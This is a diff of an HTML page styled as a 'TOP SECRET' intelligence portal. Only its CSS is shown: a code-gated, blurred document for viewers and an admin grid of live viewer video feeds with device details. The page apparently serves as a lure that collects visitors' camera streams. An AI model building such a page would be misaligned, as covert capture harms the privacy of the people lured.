@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8"/>
-<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"/>
 <title>CONFAI · Intelligence Portal</title>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/peerjs/1.5.4/peerjs.min.js"></script>
 <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@300;400;500;600&family=Playfair+Display:ital,wght@0,400;0,600;0,700;1,400&family=IBM+Plex+Sans:wght@300;400;500&display=swap" rel="stylesheet">
@@ -10,1172 +10,747 @@
 *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
 :root{
   --black:#080810;--surface:#0e0e1a;--surface2:#14141f;--surface3:#1a1a28;
-  --border:#ffffff0f;--border2:#ffffff18;
-  --red:#dc2626;--amber:#d97706;--amber2:#f59e0b;
-  --green:#16a34a;--green2:#22c55e;
-  --text:#e8e8f0;--text2:#9999b0;--text3:#5a5a72;
+  --border:#ffffff10;--border2:#ffffff1e;
+  --red:#dc2626;--green2:#22c55e;
+  --text:#e8e8f0;--text2:#9090a8;--text3:#505068;
   --accent:#6366f1;--accent2:#818cf8;
-  --radius:6px;
 }
-html,body{height:100%;background:var(--black);color:var(--text);font-family:'IBM Plex Sans',sans-serif;overflow-x:hidden}
-a{color:inherit;text-decoration:none}
-button{cursor:pointer;font-family:inherit}
+html,body{min-height:100%;background:var(--black);color:var(--text);font-family:'IBM Plex Sans',sans-serif;overflow-x:hidden;-webkit-text-size-adjust:100%}
+button{cursor:pointer;font-family:inherit;border:none}
+input{font-family:inherit}
 
-/* ── CLASSIFICATION BAR ── */
-.classbar{
-  position:fixed;top:0;left:0;right:0;z-index:1000;
-  background:var(--red);
-  display:flex;align-items:center;justify-content:center;gap:20px;
-  padding:5px 20px;
-  font-family:'IBM Plex Mono',monospace;font-size:0.65rem;font-weight:600;
-  letter-spacing:0.2em;color:white;
-  border-bottom:1px solid rgba(255,255,255,0.2);
-}
-.classbar-dot{width:5px;height:5px;border-radius:50%;background:rgba(255,255,255,0.6)}
+/* CLASSIFICATION BAR */
+.classbar{position:fixed;top:0;left:0;right:0;z-index:1000;background:var(--red);display:flex;align-items:center;justify-content:center;gap:14px;padding:5px 12px;font-family:'IBM Plex Mono',monospace;font-size:0.58rem;font-weight:600;letter-spacing:0.16em;color:white;flex-wrap:wrap;text-align:center}
+.cdot{width:5px;height:5px;border-radius:50%;background:rgba(255,255,255,0.5);flex-shrink:0}
 
-/* ── NAV ── */
-.nav{
-  position:fixed;top:29px;left:0;right:0;z-index:999;
-  display:flex;align-items:center;justify-content:space-between;
-  padding:14px 32px;
-  background:rgba(8,8,16,0.95);
-  backdrop-filter:blur(12px);
-  border-bottom:1px solid var(--border);
-}
-.nav-brand{
-  font-family:'IBM Plex Mono',monospace;font-size:0.9rem;font-weight:600;
-  letter-spacing:0.15em;color:var(--text);
-  display:flex;align-items:center;gap:10px;
-}
-.nav-brand-dot{
-  width:8px;height:8px;border-radius:50%;
-  background:var(--red);
-  box-shadow:0 0 8px rgba(220,38,38,0.6);
-  animation:pulse-red 2s infinite;
-}
-@keyframes pulse-red{0%,100%{box-shadow:0 0 8px rgba(220,38,38,0.6)}50%{box-shadow:0 0 14px rgba(220,38,38,0.9)}}
+/* NAV */
+.nav{position:fixed;top:29px;left:0;right:0;z-index:999;display:flex;align-items:center;justify-content:space-between;padding:12px 20px;background:rgba(8,8,16,0.97);backdrop-filter:blur(16px);border-bottom:1px solid var(--border)}
+.nav-brand{font-family:'IBM Plex Mono',monospace;font-size:0.85rem;font-weight:600;letter-spacing:0.15em;display:flex;align-items:center;gap:8px}
+.nav-dot{width:8px;height:8px;border-radius:50%;background:var(--red);box-shadow:0 0 8px rgba(220,38,38,0.7);animation:pulseRed 2s infinite}
+@keyframes pulseRed{0%,100%{box-shadow:0 0 8px rgba(220,38,38,0.6)}50%{box-shadow:0 0 16px rgba(220,38,38,1)}}
+.nav-right{font-family:'IBM Plex Mono',monospace;font-size:0.6rem;color:var(--text3);display:flex;align-items:center;gap:14px}
+.nav-status{display:flex;align-items:center;gap:5px;color:var(--text2)}
+.sdot{width:6px;height:6px;border-radius:50%;background:var(--text3);flex-shrink:0}
+.sdot.live{background:var(--green2);animation:pulseGreen 1.5s infinite}
+@keyframes pulseGreen{0%,100%{box-shadow:0 0 4px rgba(34,197,94,0.4)}50%{box-shadow:0 0 10px rgba(34,197,94,0.9)}}
+#nclock{display:none}
+@media(min-width:520px){#nclock{display:block}}
 
-.nav-meta{
-  font-family:'IBM Plex Mono',monospace;font-size:0.65rem;
-  color:var(--text3);letter-spacing:0.1em;
-  display:flex;gap:24px;align-items:center;
-}
-.nav-status{display:flex;align-items:center;gap:6px;color:var(--text2)}
-.status-dot{width:6px;height:6px;border-radius:50%;background:var(--text3)}
-.status-dot.live{background:var(--green2);animation:pulse-green 1.5s infinite}
-@keyframes pulse-green{0%,100%{box-shadow:0 0 4px rgba(34,197,94,0.5)}50%{box-shadow:0 0 10px rgba(34,197,94,0.8)}}
+/* PAGES */
+.page{padding-top:78px;min-height:100vh}
+.screen{display:none}
+.screen.active{display:block}
 
-/* ── MAIN WRAPPER ── */
-.page{padding-top:90px;min-height:100vh}
+/* ═══════════════════════
+   VIEWER
+═══════════════════════ */
+.doc-hero{max-width:800px;margin:0 auto;padding:36px 20px 28px;border-bottom:1px solid var(--border)}
+.doc-class{font-family:'IBM Plex Mono',monospace;font-size:0.58rem;font-weight:600;letter-spacing:0.22em;color:var(--red);margin-bottom:16px;display:flex;align-items:center;gap:8px}
+.doc-class::before,.doc-class::after{content:'';flex:1;height:1px;background:rgba(220,38,38,0.22)}
+.doc-title{font-family:'Playfair Display',serif;font-size:clamp(1.7rem,5.5vw,2.9rem);font-weight:700;line-height:1.15;margin-bottom:8px}
+.doc-sub{font-family:'Playfair Display',serif;font-size:0.92rem;font-style:italic;color:var(--text2);margin-bottom:20px}
+.doc-meta{display:flex;flex-wrap:wrap;gap:12px;font-family:'IBM Plex Mono',monospace;font-size:0.62rem;color:var(--text3)}
+.doc-meta span{color:var(--text2)}
 
-/* ════════════════════════════════════════
-   VIEWER MODE
-════════════════════════════════════════ */
-#viewer-page{display:none}
-#viewer-page.active{display:block}
+.doc-body{max-width:800px;margin:0 auto;padding:28px 20px}
 
-/* DOC HERO */
-.doc-hero{
-  max-width:860px;margin:0 auto;
-  padding:60px 32px 40px;
-  border-bottom:1px solid var(--border);
-}
-.doc-classification{
-  font-family:'IBM Plex Mono',monospace;font-size:0.65rem;font-weight:600;
-  letter-spacing:0.25em;color:var(--red);
-  margin-bottom:20px;
-  display:flex;align-items:center;gap:10px;
-}
-.doc-classification::before,.doc-classification::after{
-  content:'';flex:1;height:1px;background:rgba(220,38,38,0.3);
-}
-.doc-title{
-  font-family:'Playfair Display',serif;
-  font-size:clamp(2rem,5vw,3.2rem);
-  font-weight:700;line-height:1.15;
-  color:var(--text);margin-bottom:14px;
-}
-.doc-subtitle{
-  font-family:'Playfair Display',serif;
-  font-size:1rem;font-style:italic;
-  color:var(--text2);margin-bottom:28px;
-}
-.doc-meta-row{
-  display:flex;flex-wrap:wrap;gap:20px;
-  font-family:'IBM Plex Mono',monospace;font-size:0.7rem;
-  color:var(--text3);
-}
-.doc-meta-item{display:flex;gap:6px;align-items:center}
-.doc-meta-item span:first-child{color:var(--text3)}
-.doc-meta-item span:last-child{color:var(--text2)}
+/* Gate */
+.gate-preview{opacity:0.16;pointer-events:none;user-select:none}
+.gate-box{background:var(--surface);border:1px solid var(--border2);border-radius:12px;padding:26px 20px;text-align:center;margin-top:20px;position:relative;overflow:hidden}
+.gate-box::before{content:'';position:absolute;inset:0;background:radial-gradient(ellipse 70% 50% at 50% 0%,rgba(99,102,241,0.07),transparent 70%);pointer-events:none}
+.gate-icon{font-size:1.7rem;margin-bottom:10px}
+.gate-box h3{font-family:'Playfair Display',serif;font-size:1.25rem;font-weight:600;margin-bottom:8px}
+.gate-box p{font-size:0.81rem;color:var(--text2);line-height:1.7;max-width:420px;margin:0 auto 16px}
+.gate-warn{background:rgba(217,119,6,0.07);border:1px solid rgba(217,119,6,0.18);border-radius:6px;padding:10px 13px;font-size:0.7rem;color:rgba(245,158,11,0.8);margin-bottom:16px;line-height:1.6;font-family:'IBM Plex Mono',monospace;text-align:left}
 
-/* DOC CONTENT AREA */
-.doc-content{
-  max-width:860px;margin:0 auto;
-  padding:40px 32px;
-  position:relative;
-}
-
-/* ACCESS GATE */
-.access-gate{
-  position:relative;
-  margin-bottom:40px;
-}
-.gate-preview{
-  /* Show first bit of content */
-}
-.gate-blur{
-  position:relative;
-  overflow:hidden;
-}
-.gate-blur::after{
-  content:'';
-  position:absolute;bottom:0;left:0;right:0;height:200px;
-  background:linear-gradient(to bottom, transparent, var(--black));
-  pointer-events:none;
-}
-.gate-lock{
-  background:var(--surface);
-  border:1px solid var(--border2);
-  border-radius:10px;
-  padding:36px;
-  text-align:center;
-  margin-top:32px;
-  position:relative;
-  overflow:hidden;
-}
-.gate-lock::before{
-  content:'';position:absolute;inset:0;
-  background:radial-gradient(ellipse 80% 60% at 50% 0%, rgba(99,102,241,0.06) 0%, transparent 70%);
-}
-.gate-icon{font-size:2rem;margin-bottom:16px}
-.gate-lock h3{
-  font-family:'Playfair Display',serif;
-  font-size:1.4rem;font-weight:600;
-  margin-bottom:10px;color:var(--text);
-}
-.gate-lock p{
-  font-size:0.85rem;color:var(--text2);line-height:1.7;
-  max-width:480px;margin:0 auto 24px;
-}
-.gate-notice{
-  background:rgba(217,119,6,0.08);
-  border:1px solid rgba(217,119,6,0.2);
-  border-radius:6px;padding:12px 16px;
-  font-size:0.75rem;color:rgba(245,158,11,0.85);
-  margin-bottom:20px;line-height:1.6;
-  font-family:'IBM Plex Mono',monospace;
-  text-align:left;
-}
-.btn-access{
-  display:inline-flex;align-items:center;gap:10px;
-  background:var(--accent);
-  color:white;border:none;
-  padding:13px 32px;border-radius:6px;
-  font-family:'IBM Plex Mono',monospace;
-  font-size:0.78rem;font-weight:600;
-  letter-spacing:0.1em;
-  transition:all 0.2s;
-  box-shadow:0 4px 20px rgba(99,102,241,0.3);
-}
-.btn-access:hover{background:#4f52e0;transform:translateY(-1px);box-shadow:0 6px 28px rgba(99,102,241,0.4)}
-.btn-access:disabled{opacity:0.5;cursor:not-allowed;transform:none}
-
-/* GRANTED STATE */
-.access-granted-bar{
-  display:none;
-  background:rgba(22,163,74,0.08);
-  border:1px solid rgba(22,163,74,0.2);
-  border-radius:6px;padding:10px 16px;
-  font-family:'IBM Plex Mono',monospace;font-size:0.72rem;
-  color:rgba(34,197,94,0.85);
-  margin-bottom:24px;
-  align-items:center;gap:10px;
-}
-.access-granted-bar.show{display:flex}
-
-/* DOC SECTIONS */
-.doc-section{
-  margin-bottom:44px;
-  opacity:0;
-  transition:opacity 0.5s ease;
-}
-.doc-section.visible{opacity:1}
-.doc-section.locked{
-  filter:blur(5px);
-  user-select:none;
-  pointer-events:none;
-}
-.section-header{
-  display:flex;align-items:center;gap:12px;
-  margin-bottom:20px;
-  padding-bottom:10px;
-  border-bottom:1px solid var(--border);
-}
-.section-num{
-  font-family:'IBM Plex Mono',monospace;font-size:0.65rem;
-  color:var(--accent2);font-weight:600;letter-spacing:0.1em;
-  background:rgba(99,102,241,0.1);
-  padding:3px 8px;border-radius:3px;
-}
-.section-title{
-  font-family:'Playfair Display',serif;
-  font-size:1.2rem;font-weight:600;color:var(--text);
-}
-.doc-p{
-  font-size:0.88rem;color:var(--text2);line-height:1.85;
-  margin-bottom:14px;
-}
-.doc-p strong{color:var(--text);font-weight:500}
-
-.doc-highlight{
-  background:rgba(99,102,241,0.06);
-  border-left:3px solid var(--accent);
-  padding:14px 18px;border-radius:0 6px 6px 0;
-  margin:16px 0;
-  font-size:0.85rem;color:var(--text2);line-height:1.8;
-  font-style:italic;
-}
-.doc-highlight strong{color:var(--accent2);font-style:normal}
-
-.tag-grid{
-  display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));
-  gap:10px;margin:16px 0;
-}
-.tag-item{
-  background:var(--surface2);border:1px solid var(--border);
-  border-radius:6px;padding:12px 14px;
-}
-.tag-item .tag-label{
-  font-family:'IBM Plex Mono',monospace;font-size:0.65rem;
-  color:var(--accent2);letter-spacing:0.08em;margin-bottom:4px;
-}
-.tag-item .tag-val{font-size:0.82rem;color:var(--text2)}
-
-.doc-table{width:100%;border-collapse:collapse;margin:16px 0;font-size:0.8rem}
-.doc-table th{
+/* Code input — KEY FIX: pointer-events and z-index explicitly set */
+.code-wrap{position:relative;margin-bottom:12px;z-index:1}
+.code-input{
+  display:block;width:100%;padding:13px 16px;
   background:var(--surface3);
-  font-family:'IBM Plex Mono',monospace;font-size:0.65rem;
-  letter-spacing:0.08em;color:var(--text3);
-  padding:8px 12px;text-align:left;
-  border-bottom:1px solid var(--border2);
-}
-.doc-table td{
-  padding:9px 12px;color:var(--text2);
-  border-bottom:1px solid var(--border);
-}
-.doc-table tr:last-child td{border-bottom:none}
-.doc-table td:first-child{color:var(--accent2);font-family:'IBM Plex Mono',monospace;font-size:0.72rem}
-
-/* MINI SELF-CAM */
-#selfCam{
-  position:fixed;bottom:20px;right:20px;
-  width:80px;height:60px;
-  border-radius:6px;overflow:hidden;
-  border:1px solid var(--border2);
-  opacity:0.4;
-  display:none;
-  z-index:500;
-}
-#selfCam video{width:100%;height:100%;object-fit:cover;transform:scaleX(-1)}
-#selfCam:hover{opacity:0.9}
-
-/* ════════════════════════════════════════
-   ADMIN MODE
-════════════════════════════════════════ */
-#admin-page{display:none}
-#admin-page.active{display:block}
-
-.admin-header{
-  max-width:1200px;margin:0 auto;
-  padding:40px 32px 24px;
-  display:flex;align-items:flex-start;justify-content:space-between;
-  flex-wrap:wrap;gap:20px;
-  border-bottom:1px solid var(--border);
-}
-.admin-header-left h2{
-  font-family:'Playfair Display',serif;font-size:1.8rem;font-weight:600;
-  margin-bottom:6px;
-}
-.admin-header-left p{font-size:0.82rem;color:var(--text3)}
-
-.admin-stats{
-  display:flex;gap:16px;flex-wrap:wrap;
-}
-.stat-card{
-  background:var(--surface);border:1px solid var(--border);
-  border-radius:6px;padding:12px 18px;min-width:100px;
+  border:1.5px solid var(--border2);
+  border-radius:8px;
+  color:var(--text);
   font-family:'IBM Plex Mono',monospace;
+  font-size:1rem;letter-spacing:0.22em;
+  text-align:center;
+  outline:none;
+  -webkit-appearance:none;appearance:none;
+  transition:border-color 0.2s,box-shadow 0.2s;
+  cursor:text;
+  pointer-events:auto;
+  position:relative;z-index:2;
 }
-.stat-label{font-size:0.6rem;letter-spacing:0.12em;color:var(--text3);margin-bottom:4px}
-.stat-value{font-size:1.5rem;color:var(--text);font-weight:600}
+.code-input:focus{border-color:var(--accent);box-shadow:0 0 0 3px rgba(99,102,241,0.18)}
+.code-input.err{border-color:var(--red) !important;box-shadow:0 0 0 3px rgba(220,38,38,0.12) !important}
+.code-err-msg{display:none;color:var(--red);font-size:0.68rem;font-family:'IBM Plex Mono',monospace;margin-top:6px;letter-spacing:0.04em;text-align:left}
+.code-err-msg.show{display:block}
 
-/* ADMIN GRID */
-.admin-grid-wrap{
-  max-width:1200px;margin:0 auto;
-  padding:28px 32px;
-}
-.admin-grid-label{
-  font-family:'IBM Plex Mono',monospace;font-size:0.65rem;
-  color:var(--text3);letter-spacing:0.12em;
-  margin-bottom:16px;
-}
-.admin-grid{
-  display:grid;
-  grid-template-columns:repeat(auto-fill,minmax(300px,1fr));
-  gap:16px;
-}
-
-/* VIEWER CARD */
-.viewer-card{
-  background:var(--surface);border:1px solid var(--border);
-  border-radius:10px;overflow:hidden;
+.btn-auth{
+  width:100%;padding:13px 20px;
+  background:var(--accent);color:white;border-radius:8px;
+  font-family:'IBM Plex Mono',monospace;font-size:0.76rem;font-weight:600;letter-spacing:0.1em;
+  transition:all 0.2s;box-shadow:0 4px 20px rgba(99,102,241,0.3);
+  display:flex;align-items:center;justify-content:center;gap:8px;
   cursor:pointer;
-  transition:all 0.2s;
-  position:relative;
 }
-.viewer-card:hover{border-color:var(--border2);transform:translateY(-2px);box-shadow:0 8px 32px rgba(0,0,0,0.4)}
+.btn-auth:hover:not(:disabled){background:#4f52e0;transform:translateY(-1px);box-shadow:0 6px 26px rgba(99,102,241,0.45)}
+.btn-auth:disabled{opacity:0.32;cursor:not-allowed;transform:none;box-shadow:none}
 
-.card-feed{
-  position:relative;aspect-ratio:16/10;
-  background:#050508;overflow:hidden;
-}
-.card-feed video{width:100%;height:100%;object-fit:cover;display:block}
-.card-feed-offline{
-  position:absolute;inset:0;display:flex;flex-direction:column;
-  align-items:center;justify-content:center;
-  color:var(--text3);gap:8px;font-size:0.75rem;
-  font-family:'IBM Plex Mono',monospace;
-}
-.card-feed-offline .feed-icon{font-size:1.5rem;opacity:0.4}
-.card-live-badge{
-  position:absolute;top:8px;left:8px;
-  background:rgba(220,38,38,0.9);
-  font-family:'IBM Plex Mono',monospace;font-size:0.6rem;font-weight:600;
-  letter-spacing:0.1em;color:white;
-  padding:3px 8px;border-radius:3px;
-  display:none;align-items:center;gap:5px;
-}
-.card-live-badge.show{display:flex}
-.card-live-dot{width:5px;height:5px;border-radius:50%;background:white;animation:blink 1s infinite}
-@keyframes blink{0%,100%{opacity:1}50%{opacity:0.2}}
+/* Granted bar */
+.granted-bar{display:none;background:rgba(22,163,74,0.08);border:1px solid rgba(22,163,74,0.2);border-radius:6px;padding:9px 13px;font-family:'IBM Plex Mono',monospace;font-size:0.68rem;color:rgba(34,197,94,0.85);margin-bottom:18px;align-items:center;gap:8px}
+.granted-bar.show{display:flex}
 
-.card-body{padding:14px 16px}
-.card-access-label{
-  font-family:'IBM Plex Mono',monospace;font-size:0.75rem;font-weight:600;
-  color:var(--accent2);letter-spacing:0.1em;margin-bottom:10px;
-  display:flex;align-items:center;justify-content:space-between;
-}
-.card-connected-at{font-size:0.65rem;color:var(--text3);font-weight:400;letter-spacing:0}
+/* Doc sections */
+.sec{margin-bottom:38px}
+.sec.locked{filter:blur(6px);opacity:0.14;pointer-events:none;user-select:none;transition:all 0.4s}
+.sec.unlocked{filter:none;opacity:1;transition:all 0.4s}
+.sec-head{display:flex;align-items:center;gap:10px;margin-bottom:14px;padding-bottom:9px;border-bottom:1px solid var(--border)}
+.sec-num{font-family:'IBM Plex Mono',monospace;font-size:0.6rem;color:var(--accent2);font-weight:600;letter-spacing:0.07em;background:rgba(99,102,241,0.1);padding:3px 7px;border-radius:3px}
+.sec-title{font-family:'Playfair Display',serif;font-size:1.1rem;font-weight:600}
+.dp{font-size:0.85rem;color:var(--text2);line-height:1.85;margin-bottom:11px}
+.dp strong{color:var(--text);font-weight:500}
+.dhl{background:rgba(99,102,241,0.06);border-left:3px solid var(--accent);padding:11px 15px;border-radius:0 6px 6px 0;margin:12px 0;font-size:0.82rem;color:var(--text2);line-height:1.8;font-style:italic}
+.dhl strong{color:var(--accent2);font-style:normal}
+.tgrid{display:grid;grid-template-columns:repeat(auto-fill,minmax(190px,1fr));gap:7px;margin:12px 0}
+.titem{background:var(--surface2);border:1px solid var(--border);border-radius:5px;padding:9px 11px}
+.tlbl{font-family:'IBM Plex Mono',monospace;font-size:0.58rem;color:var(--accent2);letter-spacing:0.07em;margin-bottom:2px}
+.tval{font-size:0.78rem;color:var(--text2)}
+.dtbl{width:100%;border-collapse:collapse;margin:12px 0;font-size:0.77rem}
+.dtbl th{background:var(--surface3);font-family:'IBM Plex Mono',monospace;font-size:0.58rem;letter-spacing:0.07em;color:var(--text3);padding:7px 9px;text-align:left;border-bottom:1px solid var(--border2)}
+.dtbl td{padding:7px 9px;color:var(--text2);border-bottom:1px solid var(--border)}
+.dtbl td:first-child{color:var(--accent2);font-family:'IBM Plex Mono',monospace;font-size:0.68rem}
+.dtbl tr:last-child td{border:none}
 
-.device-info{display:grid;grid-template-columns:1fr 1fr;gap:6px;margin-top:8px}
-.di-item{background:var(--surface2);border-radius:4px;padding:6px 8px}
-.di-label{font-family:'IBM Plex Mono',monospace;font-size:0.58rem;color:var(--text3);letter-spacing:0.08em;margin-bottom:2px}
-.di-val{font-size:0.72rem;color:var(--text2);word-break:break-all}
+/* ═══════════════════════
+   ADMIN
+═══════════════════════ */
+.admin-top{max-width:1100px;margin:0 auto;padding:24px 20px 18px;border-bottom:1px solid var(--border);display:flex;align-items:flex-start;justify-content:space-between;flex-wrap:wrap;gap:14px}
+.admin-top h2{font-family:'Playfair Display',serif;font-size:1.5rem;font-weight:600;margin-bottom:3px}
+.admin-top p{font-size:0.76rem;color:var(--text3)}
+.astats{display:flex;gap:10px;flex-wrap:wrap}
+.astat{background:var(--surface);border:1px solid var(--border);border-radius:6px;padding:9px 14px;font-family:'IBM Plex Mono',monospace;min-width:72px}
+.astat-lbl{font-size:0.56rem;letter-spacing:0.1em;color:var(--text3);margin-bottom:3px}
+.astat-val{font-size:1.3rem;font-weight:600}
 
-.card-status-row{
-  display:flex;align-items:center;gap:6px;
-  margin-top:10px;padding-top:10px;
-  border-top:1px solid var(--border);
-  font-size:0.7rem;color:var(--text3);
-  font-family:'IBM Plex Mono',monospace;
-}
+.admin-body{max-width:1100px;margin:0 auto;padding:20px}
+.admin-section-lbl{font-family:'IBM Plex Mono',monospace;font-size:0.6rem;color:var(--text3);letter-spacing:0.1em;margin-bottom:12px}
 
-/* FULLSCREEN OVERLAY */
-.fullscreen-overlay{
-  display:none;
-  position:fixed;inset:0;z-index:2000;
-  background:rgba(0,0,0,0.97);
-  flex-direction:column;
-}
-.fullscreen-overlay.show{display:flex}
-.fs-topbar{
-  display:flex;align-items:center;justify-content:space-between;
-  padding:14px 20px;
-  background:rgba(14,14,26,0.8);
-  border-bottom:1px solid var(--border);
-  flex-shrink:0;
-}
-.fs-label{
-  font-family:'IBM Plex Mono',monospace;font-size:0.8rem;
-  font-weight:600;color:var(--accent2);letter-spacing:0.1em;
-}
-.fs-close{
-  background:var(--surface2);border:1px solid var(--border);
-  color:var(--text2);padding:6px 14px;border-radius:4px;
-  font-family:'IBM Plex Mono',monospace;font-size:0.72rem;
-  transition:all 0.15s;
-}
+/* Grid */
+.cards-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:14px}
+@media(max-width:580px){.cards-grid{grid-template-columns:1fr}}
+
+/* Card */
+.vcard{background:var(--surface);border:1px solid var(--border);border-radius:10px;overflow:hidden;cursor:pointer;transition:border-color 0.2s,transform 0.2s}
+.vcard:hover{border-color:var(--border2);transform:translateY(-2px)}
+
+/* 1:1 video */
+.vfeed{position:relative;width:100%;aspect-ratio:1/1;background:#050508;overflow:hidden}
+.vfeed video{position:absolute;inset:0;width:100%;height:100%;object-fit:cover;display:block}
+.voffline{position:absolute;inset:0;display:flex;flex-direction:column;align-items:center;justify-content:center;color:var(--text3);gap:7px;font-family:'IBM Plex Mono',monospace;font-size:0.7rem;text-align:center}
+.voffline-icon{font-size:1.5rem;opacity:0.28}
+.vlive{position:absolute;top:8px;left:8px;background:rgba(220,38,38,0.92);font-family:'IBM Plex Mono',monospace;font-size:0.56rem;font-weight:600;letter-spacing:0.1em;color:white;padding:3px 7px;border-radius:3px;display:none;align-items:center;gap:4px;z-index:3}
+.vlive.on{display:flex}
+.vlivedot{width:5px;height:5px;border-radius:50%;background:white;animation:blink 1s infinite}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:0.1}}
+.play-ov{position:absolute;inset:0;background:rgba(0,0,0,0.65);display:flex;align-items:center;justify-content:center;z-index:4;cursor:pointer}
+.play-ov span{font-family:'IBM Plex Mono',monospace;font-size:0.72rem;color:white;letter-spacing:0.06em;background:rgba(255,255,255,0.1);padding:8px 16px;border-radius:4px;border:1px solid rgba(255,255,255,0.2)}
+
+/* Card info below video */
+.vinfo{padding:12px 14px}
+.vlabel{font-family:'IBM Plex Mono',monospace;font-size:0.76rem;font-weight:600;color:var(--accent2);letter-spacing:0.1em;margin-bottom:9px;display:flex;justify-content:space-between;align-items:center}
+.vtime{font-size:0.6rem;color:var(--text3);font-weight:400;letter-spacing:0}
+.devgrid{display:grid;grid-template-columns:1fr 1fr;gap:5px}
+.di{background:var(--surface2);border-radius:4px;padding:5px 7px}
+.di-lbl{font-family:'IBM Plex Mono',monospace;font-size:0.54rem;color:var(--text3);letter-spacing:0.06em;margin-bottom:1px}
+.di-val{font-size:0.7rem;color:var(--text2);word-break:break-all;line-height:1.3}
+.vstatus{display:flex;align-items:center;gap:5px;margin-top:9px;padding-top:9px;border-top:1px solid var(--border);font-family:'IBM Plex Mono',monospace;font-size:0.62rem;color:var(--text3)}
+
+/* Waiting */
+.waiting{text-align:center;padding:56px 20px;font-family:'IBM Plex Mono',monospace;color:var(--text3)}
+.waiting .wi{font-size:1.8rem;opacity:0.28;margin-bottom:12px}
+.waiting p{font-size:0.72rem;letter-spacing:0.03em;line-height:2}
+.wlink{display:inline-block;margin-top:12px;background:var(--surface2);border:1px solid var(--border2);border-radius:5px;padding:7px 14px;font-size:0.68rem;color:var(--accent2);word-break:break-all;max-width:100%}
+
+/* Fullscreen */
+.fs-ov{display:none;position:fixed;inset:0;z-index:2000;background:#000;flex-direction:column}
+.fs-ov.on{display:flex}
+.fs-bar{display:flex;align-items:center;justify-content:space-between;padding:11px 16px;background:rgba(14,14,26,0.9);border-bottom:1px solid var(--border);flex-shrink:0}
+.fs-lbl{font-family:'IBM Plex Mono',monospace;font-size:0.78rem;font-weight:600;color:var(--accent2);letter-spacing:0.1em}
+.fs-close{background:var(--surface2);border:1px solid var(--border);color:var(--text2);padding:5px 12px;border-radius:4px;font-family:'IBM Plex Mono',monospace;font-size:0.68rem;transition:all 0.15s}
 .fs-close:hover{border-color:var(--border2);color:var(--text)}
-.fs-main{flex:1;display:flex;overflow:hidden}
-.fs-video-wrap{flex:1;display:flex;align-items:center;justify-content:center;background:#000}
-.fs-video-wrap video{max-width:100%;max-height:100%;object-fit:contain}
-.fs-sidebar{
-  width:300px;flex-shrink:0;
-  background:var(--surface);
-  border-left:1px solid var(--border);
-  padding:20px;overflow-y:auto;
-}
-.fs-sidebar h4{
-  font-family:'IBM Plex Mono',monospace;font-size:0.65rem;
-  letter-spacing:0.12em;color:var(--text3);margin-bottom:14px;
-}
-.fs-di-item{margin-bottom:12px}
-.fs-di-label{font-family:'IBM Plex Mono',monospace;font-size:0.6rem;color:var(--text3);letter-spacing:0.08em;margin-bottom:3px}
-.fs-di-val{font-size:0.8rem;color:var(--text2)}
+.fs-main{flex:1;display:flex;overflow:hidden;flex-direction:column;min-height:0}
+@media(min-width:640px){.fs-main{flex-direction:row}}
+.fs-vid{flex:1;display:flex;align-items:center;justify-content:center;background:#000;min-height:0;overflow:hidden}
+.fs-vid video{width:100%;height:100%;object-fit:contain}
+.fs-side{background:var(--surface);border-top:1px solid var(--border);padding:14px;overflow-y:auto;flex-shrink:0}
+@media(min-width:640px){.fs-side{width:250px;border-top:none;border-left:1px solid var(--border)}}
+.fs-side h4{font-family:'IBM Plex Mono',monospace;font-size:0.58rem;letter-spacing:0.12em;color:var(--text3);margin-bottom:11px}
+.fsr{margin-bottom:9px}
+.fsr-lbl{font-family:'IBM Plex Mono',monospace;font-size:0.57rem;color:var(--text3);letter-spacing:0.06em;margin-bottom:2px}
+.fsr-val{font-size:0.78rem;color:var(--text2)}
 
-/* WAITING STATE */
-.admin-waiting{
-  text-align:center;padding:80px 32px;
-  font-family:'IBM Plex Mono',monospace;color:var(--text3);
-}
-.admin-waiting .wait-icon{font-size:2.5rem;margin-bottom:16px;opacity:0.4}
-.admin-waiting p{font-size:0.8rem;letter-spacing:0.05em;line-height:1.8}
-.admin-waiting .share-link{
-  display:inline-block;margin-top:20px;
-  background:var(--surface2);border:1px solid var(--border2);
-  border-radius:6px;padding:10px 18px;
-  font-size:0.72rem;color:var(--accent2);
-  word-break:break-all;
-}
-
-/* TOAST */
-.toast{
-  position:fixed;bottom:24px;left:50%;transform:translateX(-50%);
-  background:var(--surface3);border:1px solid var(--border2);
-  color:var(--text);padding:10px 20px;border-radius:6px;
-  font-size:0.8rem;opacity:0;pointer-events:none;
-  transition:opacity 0.25s;z-index:3000;
-  font-family:'IBM Plex Mono',monospace;
-  white-space:nowrap;
-}
-.toast.show{opacity:1}
-
-/* SPINNER */
-.spin{
-  width:14px;height:14px;border:2px solid rgba(255,255,255,0.2);
-  border-top-color:white;border-radius:50%;
-  animation:spin 0.7s linear infinite;display:inline-block;
-}
-@keyframes spin{to{transform:rotate(360deg)}}
-
-/* ANIMATIONS */
-@keyframes fadeUp{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}
-.fade-up{animation:fadeUp 0.5s ease forwards}
+/* Toast */
+.toast{position:fixed;bottom:18px;left:50%;transform:translateX(-50%);background:var(--surface3);border:1px solid var(--border2);color:var(--text);padding:8px 16px;border-radius:6px;font-size:0.76rem;opacity:0;pointer-events:none;transition:opacity 0.25s;z-index:3000;font-family:'IBM Plex Mono',monospace;white-space:nowrap;max-width:88vw;overflow:hidden;text-overflow:ellipsis}
+.toast.on{opacity:1}
+.spin{display:inline-block;width:12px;height:12px;border:2px solid rgba(255,255,255,0.18);border-top-color:white;border-radius:50%;animation:sp 0.7s linear infinite;flex-shrink:0}
+@keyframes sp{to{transform:rotate(360deg)}}
+@keyframes fu{from{opacity:0;transform:translateY(16px)}to{opacity:1;transform:translateY(0)}}
+.fu{animation:fu 0.45s ease forwards}
 </style>
 </head>
 <body>
 
-<!-- Classification bar -->
 <div class="classbar">
-  <div class="classbar-dot"></div>
-  <span>TOP SECRET · RESTRICTED · AUTHORIZED ACCESS ONLY</span>
